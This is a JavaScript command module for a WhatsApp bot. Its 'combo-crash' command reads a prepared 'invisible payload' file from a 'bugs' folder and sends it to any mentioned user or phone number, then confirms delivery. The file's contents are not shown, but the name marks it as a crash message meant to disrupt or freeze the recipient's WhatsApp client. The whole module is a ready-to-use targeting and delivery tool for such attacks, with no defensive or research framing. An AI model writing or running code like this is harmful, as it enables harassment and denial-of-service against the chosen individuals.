import fs from 'fs';
import path from 'path';

export default {
  name: "combo-crash",
  description: "Sends invisible payload to a number or mentioned user.",
  async execute(msg, { sock, args }) {
    const filePath = path.join(process.cwd(), 'bugs', 'combo_invisible.txt');

    if (!fs.existsSync(filePath)) {
      return sock.sendMessage(
        msg.key.remoteJid,
        { text: "❌ combo_invisible.txt not found. Run `node make_combo.js` first." }
      );
    }

    let target;

    // Case 1: Mentioned user in group
    if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
      target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
    }
    // Case 2: User passed a number
    else if (args[0]) {
      const number = args[0].replace(/[^0-9]/g, ""); // clean input
      target = `${number}@s.whatsapp.net`;
    }
    // Case 3: No input
    else {
      return sock.sendMessage(
        msg.key.remoteJid,
        { text: "⚠️ Please provide a number or mention a user.\n\nExample:\n${prefix}combo-crash  2349123456789\n${prefix}combo-crash @user" }
      );
    }

    const payload = fs.readFileSync(filePath, 'utf8');

    await sock.sendMessage(target, { text: payload });

    await sock.sendMessage(
      msg.key.remoteJid,
      { text: `✅ Payload sent to ${target.replace('@s.whatsapp.net', '')}` }
    );
  },
};
